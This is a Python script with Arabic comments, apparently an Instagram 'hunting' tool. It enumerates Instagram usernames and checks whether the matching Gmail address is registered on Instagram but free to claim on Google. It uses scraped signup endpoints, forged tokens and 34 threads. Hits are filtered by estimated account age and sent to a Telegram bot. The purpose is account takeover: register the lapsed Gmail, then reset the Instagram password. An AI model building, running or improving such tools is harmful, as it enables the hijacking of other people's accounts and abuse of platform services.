import random, os, sys
try:
    import colorama
    import cython
    import zipfile
    import shutil
except ImportError:
    os.system('pip3.11 install colorama')
    os.system('pip3.9 install colorama')
    os.system('pip install shutil')
    os.system('pip install cython')
    os.system('pip install zipfile')
    import colorama
import time
from colorama import Fore, Style
import random
os.system('clear')
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
color = random.choice(colors)
print(f"{color} THIS {color}ENCODE {color}BY {color}DEVIL {color}| @{color}ALi BSSAM" + Style.RESET_ALL)
time.sleep(4)
import requests
import re
import random
import string
import json
import secrets
from user_agent import generate_user_agent as gg
from threading import Thread, Lock
import os
import sys
import time
from datetime import datetime

# -------------------- Global Counters & Locks --------------------
total_generated = 0          # Total usernames generated (including skipped due to '_')
instagram_taken = 0           # Emails found registered on Instagram
instagram_not_taken = 0       # Emails not registered on Instagram
google_available = 0          # Among Instagram taken, those available on Google (valid hits)
google_unavailable = 0        # Among Instagram taken, those already taken on Google
google_errors = 0             # Google check failed (token or request error)
counters_lock = Lock()

# -------------------- Telegram Configuration --------------------
BOT_TOKEN = input("Enter your Telegram Bot Token: ").strip()
CHAT_ID = input("Enter your Telegram Chat ID: ").strip()

# Fixed domain (Gmail)
DOMAIN = "@gmail.com"
THREADS = 34

# -------------------- Account Creation Date Estimator --------------------
def estimate_creation_date(pk_id):
    """
    تحويل رقم id (pk) إلى سنة تقريبية لإنشاء الحساب
    """
    try:
        hy = int(pk_id) if pk_id else 0
        
        # نطاقات السنوات مع القيم القصوى للـ IDs حسب الطلب
        ranges = [
            (1279000, 2010),
            (17750000, 2011),
            (279760000, 2012),
            (900990000, 2013),
            (1629010000, 2014),
            (2500000000, 2015),
            (3713668786, 2016),
            (5699785217, 2017),
            (8597939245, 2018),
            (21254029834, 2019),
        ]
        
        for upper, year in ranges:
            if hy <= upper:
                return year
        
        # إذا كان أحدث من 2019
        if hy > 21254029834:
            # نطاقات إضافية للسنوات الأحدث
            if hy <= 30577684866:
                return 2020
            elif hy <= 48009087498:
                return 2021
            elif hy <= 51994527687:
                return 2022
            else:
                return 2023
                
    except Exception:
        return None

# -------------------- Display Year Selection Menu --------------------
def show_year_menu():
    """عرض قائمة اختيار سنوات الصيد للمستخدم"""
    print("\n" + "="*60)
    print("🎯 اختيار سنة الصيد (اختر الأرقام التي تريد الصيد فيها)")
    print("="*60)
    
    year_options = {
        1: 2010, 2: 2011, 3: 2012, 4: 2013, 5: 2014,
        6: 2015, 7: 2016, 8: 2017, 9: 2018, 10: 2019,
        11: 2020, 12: 2021, 13: 2022, 14: 2023
    }
    
    # عرض السنوات بشكل منظم
    for i in range(1, 15, 3):
        line = ""
        for j in range(3):
            if i + j <= 14:
                line += f"[{i+j:2d} - {year_options[i+j]}]    "
        print(line)
    
    print("="*60)
    print("📝 يمكنك اختيار أكثر من رقم (مثال: 1,3,5-8,14)")
    print("أو اكتب 'all' لصيد جميع السنوات")
    print("="*60)
    
    while True:
        choice = input("اختيارك: ").strip().lower()
        
        if choice == 'all':
            return list(year_options.values())
        
        selected_years = set()
        parts = choice.split(',')
        
        for part in parts:
            part = part.strip()
            if '-' in part:
                # نطاق سنوات مثل 5-8
                start, end = map(int, part.split('-'))
                for num in range(start, end + 1):
                    if 1 <= num <= 14:
                        selected_years.add(year_options[num])
            else:
                # رقم فردي
                try:
                    num = int(part)
                    if 1 <= num <= 14:
                        selected_years.add(year_options[num])
                    else:
                        print(f"⚠️ الرقم {num} خارج النطاق (1-14)")
                except ValueError:
                    print(f"⚠️ إدخال غير صحيح: {part}")
        
        if selected_years:
            print(f"\n✅ تم اختيار السنوات: {sorted(selected_years)}")
            return sorted(selected_years)
        else:
            print("❌ لم تختر أي سنة صحيحة، حاول مرة أخرى")

# -------------------- Instagram Stats Fetcher --------------------
def get_instagram_stats(username):
    """
    جلب عدد المتابعين والمتابَعين ومعرف الحساب (pk) من صفحة إنستغرام العامة.
    """
    url = f"https://www.instagram.com/{username}/"
    headers = {'User-Agent': gg()}
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code != 200:
            return None, None, None

        # البحث عن meta property="og:description"
        pattern = r'<meta\s+property="og:description"\s+content="([^"]+)"'
        match = re.search(pattern, resp.text)
        
        # محاولة استخراج الـ user id (pk) من الصفحة
        pk_patterns = [
            r'"user_id":"(\d+)"',
            r'"id":"(\d+)"',
            r'"pk":(\d+)',
            r'"profilePage_(\d+)"'
        ]
        
        pk_id = None
        for pattern in pk_patterns:
            pk_match = re.search(pattern, resp.text)
            if pk_match:
                pk_id = pk_match.group(1)
                break
        
        if match:
            desc = match.group(1)
            parts = desc.split(',')
            followers_str = parts[0].strip() if len(parts) > 0 else ''
            following_str = parts[1].strip() if len(parts) > 1 else ''

            followers_num = re.search(r'([\d.,]+k?)\s*Followers', followers_str, re.IGNORECASE)
            following_num = re.search(r'([\d.,]+k?)\s*Following', following_str, re.IGNORECASE)

            followers = followers_num.group(1) if followers_num else 'N/A'
            following = following_num.group(1) if following_num else 'N/A'
            return followers, following, pk_id
        else:
            return None, None, pk_id
    except Exception as e:
        return None, None, None

# -------------------- Telegram Sender --------------------
def send_to_telegram(email, username, followers, following, creation_year):
    profile_url = f"https://www.instagram.com/{username}/"
    message = f"""
📋 ACCOUNT INFO
━━━━━━━━━━━━━━
🆔 User: {username}
📧 MAIL: {email}
🍺 Url: {profile_url}
🗓 DATE: {creation_year}-1-1
📊 FOLLOWERS: {followers}

━━━━━━━━━━━━━━
✅ Ali BssaM @as_wqt
"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=payload, timeout=5)
        print(f"\033[1;32m[✓] تم إرسال الحساب إلى التلجرام: {username} (سنة: {creation_year})\033[0m")
    except Exception as e:
        print(f"[-] Telegram send error: {e}")

# -------------------- Instagram Email Check --------------------
def insta_check(email):
    headers = {
        'X-Csrftoken': secrets.token_hex(16),
        'User-Agent': gg(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://www.instagram.com',
        'Referer': 'https://www.instagram.com/accounts/signup/email/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    try:
        res = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/check_email/',
            headers=headers,
            data={'email': email},
            timeout=10
        ).text
        return "email_is_taken" in res
    except:
        return False

# -------------------- Google Token Generation --------------------
def get_google_tokens():
    try:
        yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(random.choice(yy) for _ in range(random.randrange(6, 9)))
        n2 = ''.join(random.choice(yy) for _ in range(random.randrange(3, 9)))
        host = ''.join(random.choice(yy) for _ in range(random.randrange(15, 30)))

        headers = {"google-accounts-xsrf": "1", "user-agent": gg()}

        # Initial page request to extract token
        res = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&hl=en-GB', headers=headers, timeout=10)
        tok_search = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)

        if not tok_search:
            return None, None
        tok = tok_search.group(2)

        # Validation request to get TL
        validate_data = {
            'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        response = requests.post(
            'https://accounts.google.com/_/signup/validatepersonaldetails',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=validate_data,
            timeout=10
        )

        tl = str(response.text).split('",null,"')[1].split('"')[0]
        new_host = response.cookies.get_dict().get('__Host-GAPS', host)
        return tl, new_host
    except Exception as e:
        return None, None

# -------------------- Google Username Availability Check --------------------
def google_check(username):
    tl, host = get_google_tokens()
    if not tl:
        return None   # Failed to get tokens

    try:
        headers = {
            'authority': 'accounts.google.com',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': gg(),
        }
        data = f'f.req=%5B%22TL%3A{tl}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
        response = requests.post(
            f'https://accounts.google.com/_/signup/usernameavailability?TL={tl}',
            cookies={'__Host-GAPS': host},
            headers=headers,
            data=data,
            timeout=10
        )

        # Check response: if "gf.uar",1 means available?
        if '"gf.uar",1' in response.text:
            return True   # Available
        else:
            return False  # Not available
    except:
        return None

# -------------------- Username Generator (Instagram GraphQL) --------------------
def generate_username():
    try:
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
        user_id = str(random.randrange(849342))
        variables = json.dumps({"id": user_id, "render_surface": "PROFILE"})
        data = {
            "lsd": lsd,
            "variables": variables,
            "doc_id": "25618261841150840"
        }
        response = requests.post(
            "https://www.instagram.com/api/graphql",
            headers={"X-FB-LSD": lsd},
            data=data,
            timeout=10
        )
        response.raise_for_status()
        username = response.json()['data']['user']['username']
        return username
    except Exception:
        return None

# -------------------- Live Status Display --------------------
def status_display(selected_years):
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[1;37m" + "="*70 + "\033[0m")
        print("\033[1;36m            Instagram → Gmail Validator [Classic 2026]\033[0m")
        print("\033[1;37m" + "="*70 + "\033[0m")
        print(f"\033[1;33m🎯 سنوات الصيد المختارة: {selected_years}\033[0m")
        print("\033[1;37m" + "="*70 + "\033[0m")
        with counters_lock:
            print(f"\033[1;33m[⋆] Generated Usernames : {total_generated}\033[0m")
            print(f"\033[1;34m[✓] Instagram Checked   : {instagram_taken + instagram_not_taken}\033[0m")
            print(f"\033[1;32m    ├─ Registered (IG)   : {instagram_taken}\033[0m")
            print(f"\033[1;31m    └─ Not Registered    : {instagram_not_taken}\033[0m")
            print(f"\033[1;35m[⚡] Google Check (from IG taken):\033[0m")
            print(f"\033[1;32m    ├─ Available (VALID) : {google_available}\033[0m")
            print(f"\033[1;33m    └─ Taken (G)         : {google_unavailable}\033[0m")
            print(f"\033[1;31m    └─ Errors/Skip       : {google_errors}\033[0m")
        print("\033[1;37m" + "="*70 + "\033[0m")
        print("\033[1;90mPress Ctrl+C to stop | Results saved to valid_accounts.txt\033[0m")
        time.sleep(1)

# -------------------- Worker Thread --------------------
def worker(selected_years):
    global total_generated, instagram_taken, instagram_not_taken
    global google_available, google_unavailable, google_errors

    while True:
        # 1. Generate username
        username = generate_username()
        if not username:
            time.sleep(0.5)
            continue

        with counters_lock:
            total_generated += 1

        # 2. Skip usernames containing underscore '_'
        if '_' in username:
            continue

        # 3. Convert to Gmail
        email = username + DOMAIN

        # 4. Check Instagram
        ig_registered = insta_check(email)
        if ig_registered:
            with counters_lock:
                instagram_taken += 1

            # 5. Check Google availability
            google_status = google_check(username)
            if google_status is True:
                # جلب إحصائيات إنستغرام ومعرف الحساب
                followers, following, pk_id = get_instagram_stats(username)
                if followers is None:
                    followers = "N/A"
                    following = "N/A"
                
                # تقدير سنة الإنشاء من pk_id
                if pk_id:
                    creation_year = estimate_creation_date(pk_id)
                else:
                    creation_year = None

                # التحقق مما إذا كانت السنة المقدرة ضمن سنوات الصيد المختارة
                if creation_year and creation_year in selected_years:
                    with counters_lock:
                        google_available += 1
                    
                    # Send to Telegram بالتنسيق الجديد
                    send_to_telegram(email, username, followers, following, creation_year)
                    
                    # Save to file
                    with open("valid_accounts.txt", "a", encoding='utf-8') as f:
                        f.write(f"{email} | Year: {creation_year} | Followers: {followers} | PK: {pk_id}\n")
                    
                    print(f"\033[1;32m[✔] VALID: {email} (سنة: {creation_year}, متابعين: {followers})\033[0m")
                else:
                    # إذا لم تكن السنة ضمن المختارة، نعتبره غير مرغوب
                    with counters_lock:
                        google_available -= 1  # نرجع العداد لأننا أضفناه قبل التحقق
                        google_unavailable += 1
                    print(f"\033[1;33m[➤] حساب بسنة {creation_year} غير مطلوب: {email}\033[0m")
                    
            elif google_status is False:
                with counters_lock:
                    google_unavailable += 1
                print(f"\033[1;33m[➤] IG taken but Gmail taken: {email}\033[0m")
            else:  # None (error)
                with counters_lock:
                    google_errors += 1
                print(f"\033[1;31m[!] Google check failed for: {email}\033[0m")
        else:
            with counters_lock:
                instagram_not_taken += 1
            print(f"\033[1;90m[-] IG not registered: {email}\033[0m")

# -------------------- Main --------------------
def main():
    print("\033[1;37mStarting Instagram → Gmail Validator...\033[0m")
    
    # عرض قائمة اختيار السنوات
    selected_years = show_year_menu()
    
    print(f"\n📅 سنوات الصيد المختارة: {selected_years}")
    print(f"✅ جاري بدء الصيد بهذه السنوات...")
    print("\n\033[1;37mStarting with 20 threads. Press Ctrl+C to stop.\033[0m")
    
    # Start status thread
    status_thread = Thread(target=status_display, args=(selected_years,), daemon=True)
    status_thread.start()

    # Start worker threads
    workers = []
    for _ in range(THREADS):
        t = Thread(target=worker, args=(selected_years,), daemon=True)
        t.start()
        workers.append(t)

    try:
        # Keep main alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[1;31m[!] Stopped by user. Final stats saved.\033[0m")
        sys.exit(0)

if __name__ == "__main__":
    main()
